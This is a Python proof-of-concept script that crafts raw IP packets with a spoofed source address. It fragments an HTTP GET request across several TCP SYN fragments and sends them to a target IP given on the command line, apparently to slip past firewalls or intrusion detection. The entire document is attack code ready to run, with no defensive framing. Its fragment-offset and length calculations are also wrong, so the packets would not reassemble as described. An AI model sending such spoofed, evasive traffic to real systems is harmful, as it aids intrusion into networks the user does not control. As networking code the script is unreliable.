import socket
import struct
import random
import sys
import time

class IPFragmentationPoC:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def checksum(self, msg):
        s = 0
        
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s

    def build_ip_header(self, id, frag_offset, mf_flag, payload_len):
        version_ihl = (4 << 4) + 5
        tos = 0
        total_length = 20 + payload_len
        identification = id
        flags_fragment = (mf_flag << 13) + frag_offset
        ttl = 64
        protocol = socket.IPPROTO_TCP
        checksum = 0
        src_ip = socket.inet_aton('192.168.0.100')  
        dst_ip = socket.inet_aton(self.target_ip)

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                version_ihl,
                                tos,
                                total_length,
                                identification,
                                flags_fragment,
                                ttl,
                                protocol,
                                checksum,
                                src_ip,
                                dst_ip)

        checksum = self.checksum(ip_header)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                version_ihl,
                                tos,
                                total_length,
                                identification,
                                flags_fragment,
                                ttl,
                                protocol,
                                checksum,
                                src_ip,
                                dst_ip)
        return ip_header

    def build_tcp_header(self, seq=0):
        src_port = random.randint(1024, 65535)
        dst_port = self.target_port
        seq_num = seq
        ack_num = 0
        data_offset_reserved = (5 << 4) + 0
        flags = 2  
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port,
                                 dst_port,
                                 seq_num,
                                 ack_num,
                                 data_offset_reserved,
                                 flags,
                                 window,
                                 checksum,
                                 urg_ptr)
        return tcp_header

    def send_fragmented_packet(self, payload_parts):
        
        ip_id = random.randint(0, 65535)

        for i, payload in enumerate(payload_parts):
            
            frag_offset = (i * (len(payload) // 8))
            
            mf_flag = 1 if i < len(payload_parts) - 1 else 0

            ip_header = self.build_ip_header(ip_id, frag_offset, mf_flag, len(payload) + 20)
            tcp_header = self.build_tcp_header(seq=0)

            packet = ip_header + tcp_header + payload

            self.sock.sendto(packet, (self.target_ip, 0))
            time.sleep(0.1)  

    def run(self):
        
        http_get = b"GET / HTTP/1.1\r\nHost: target\r\n\r\n"
      
        fragments = [http_get[:10], http_get[10:20], http_get[20:]]

        print(f"[+] Sending fragmented packets to {self.target_ip}:{self.target_port}")
        self.send_fragmented_packet(fragments)
        print("[+] Packets sent.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target = sys.argv[1]
    poc = IPFragmentationPoC(target)
    poc.run()
